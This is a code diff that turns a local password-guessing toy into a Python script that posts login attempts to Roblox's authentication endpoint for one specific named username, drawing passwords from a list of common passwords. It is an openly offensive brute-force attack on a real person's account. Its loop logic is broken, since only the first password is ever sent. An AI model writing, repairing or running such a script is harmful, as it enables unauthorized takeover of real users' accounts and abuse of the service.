@@ -1,4 +1,6 @@
-password = "1991"
+import requests
+
+url = "https://auth.roblox.com/v2/login"
 
 passwordList = [
 "123456",
@@ -997,21 +999,24 @@ passwordList = [
 "england",
 "brazil",
 "1978",
-"01011980",
 "wildcat",
 "polina",
-"freepass",
+"Chrisflo80",
 ]
 
 x = 0
 
+data = {
+  'ctype': "Username",
+  'cvalue': "vteczYoutube",
+  'password': passwordList[x],
+  }
+
+response = requests.post(url, data=data).text
+
 for i in range(1000):
-
-  if passwordList[x] is not password:
-    print(passwordList[x])
-    x = x+1
-
-  if passwordList[x] == password:
-    print(passwordList[x])
-    print(f'Password Successfully Cracked: {passwordList[x]}')
-    break
+  
+  print(passwordList[x])
+  print(response)
+  x = x+1
+  
